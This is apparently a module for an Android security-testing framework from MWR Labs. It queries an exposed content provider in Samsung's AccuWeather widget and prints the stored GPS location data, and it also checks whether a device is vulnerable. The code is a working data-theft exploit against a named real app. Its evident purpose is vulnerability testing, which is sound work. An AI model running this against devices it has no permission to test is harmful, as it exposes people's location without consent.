from mwr.droidhg.modules import common, Module

class AccuWeather(Module, common.TableFormatter, common.Provider, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.sec.android.widgetapp.weatherclock."
    description = "Tests for Content Provider vulnerability in com.sec.android.widgetapp.weatherclock."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "GPS Location from AccuWeather (com.sec.android.widgetapp.weatherclock)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.sec.android.widgetapp.weatherclock")

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
        